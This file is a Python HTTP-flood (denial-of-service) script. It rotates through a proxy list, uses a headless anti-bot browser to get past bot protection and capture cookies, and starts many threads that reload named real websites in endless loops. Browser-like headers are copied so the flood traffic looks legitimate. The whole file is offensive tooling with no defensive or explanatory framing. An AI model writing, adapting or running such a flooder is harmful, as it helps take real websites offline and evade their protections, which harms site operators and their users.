import ucapi as api
import time, threading, random, requests

proxies = open("prx.txt", "r").read().split("\n")
rps=64
def fast_flooder(drive):
    print("Emulator Flood Started with cookies!")
    while True:
        drive.launch("https://graph.vshield.pro")
        if ["ERR_PROXY_CONNECTION_FAILED", "ERR_TIMED_OUT","No internet"] in drive.print_page_text():
            print("Emulation Error: Proxy Connection Error..")
            drive.close()
            return
        drive.reload(); print(drive.print_page_text())
        
        drive.reload(); print(drive.print_page_text())
        
        drive.reload(); print(drive.print_page_text())
        
        drive.reload(); print(drive.print_page_text())
        
        drive.reload(); print(drive.print_page_text())
        
        drive.reload(); print(drive.print_page_text())
        
        drive.reload(); print(drive.print_page_text())
        
        drive.reload(); print(drive.print_page_text())
        
        drive.reload(); print(drive.print_page_text())
        
        drive.reload(); print(drive.print_page_text())
        
        drive.reload(); print(drive.print_page_text())
        
        drive.reload(); print(drive.print_page_text())
        
        
        drive.reload(); print(drive.print_page_text())
        
        drive.reload(); print(drive.print_page_text())
        
        drive.reload(); print(drive.print_page_text())
        
        
        drive.reload(); print(drive.print_page_text())
        
        drive.reload(); print(drive.print_page_text())
        
        drive.reload(); print(drive.print_page_text())
        
def flooder():
    proxy = random.choice(proxies)
    try:
        browser = api.HeadlessBrowser(f"{proxy}")
        browser.launch("https://cfcybernews.eu/")
        text = browser.print_page_text()
        browser.get_cook()
        if text is None: 
            threading.Thread(target=flooder).start()
            return
        if len(text) > 10:
            print("Browser reloader started with",proxy)
            rp = 0
            threading.Thread(target=fast_flooder, args=(browser,)).start()
            threading.Thread(target=fast_flooder, args=(browser,)).start()
            threading.Thread(target=fast_flooder, args=(browser,)).start()
            threading.Thread(target=fast_flooder, args=(browser,)).start()
            while True:
                rp += 2
                browser.reload()
                browser.launch("https://cfcybernews.eu/")
                if rp == rps:
                    time.sleep(1)
                    rp = 0
        else:
            threading.Thread(target=flooder).start()
            return
    except:
        return

def fast_v2(proxy, cookie, ua, headers):
    print(f"FLOODER: {proxy} -> {cookie}:{headers}")
    while True:
        for i in range(10):
            requests.get("https://cfcybernews.eu/", headers=headers, cookies=cookie, proxies={"http":proxy})
        time.sleep(1)
def flooderv2():
    proxy = random.choice(proxies)
    try:
        browser=api.HeadlessAntiBot(f"{proxy}")
        browser.launch("https://cfcybernews.eu/")
        text = browser.print_page_text()
        if text is None: 
            threading.Thread(target=flooder).start()
            return
        if len(text) > 10:
            cook=browser.get_cook()
            if len(cook)<1:
                while len(cook)<1:
                    print(f"[{proxy}] Regrabbing cookie.")
                    browser.launch("https://cfcybernews.eu/")
                    time.sleep(1)
                    cook=browser.get_cook()
            headrs = {
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'upgrade-insecure-requests': '1',
    'user-agent': browser.ua,
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'sec-fetch-site': 'none',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-user': '?1',
    'sec-fetch-dest': 'document',
    'accept-encoding': 'gzip, deflate, br'
}
            print(f"[{proxy}] Captured headers and cookies! Sending to flooder.")
            #fast_v2(proxy, cook, browser.ua, headrs)
            fast_flooder(browser)
    except Exception as error:
        #print("Error -> ",error)
        pass

def flooderv3():
    proxy = random.choice(proxies)
    try:
        browser=api.HeadlessAntiBot(f"{proxy}")
        browser.launch("https://graph.vshield.pro")
        text = browser.print_page_text()
        if text is None: 
            threading.Thread(target=flooder).start()
            return
        if len(text) > 10:
            print(f"[{proxy}] Page loaded, Starting flooder!")
            #fast_v2(proxy, cook, browser.ua, headrs)
            fast_flooder(browser)
    except Exception as error:
        #print("Error -> ",error)
        pass


while True:
    if threading.active_count() < 15:
        threading.Thread(target=flooderv3).start()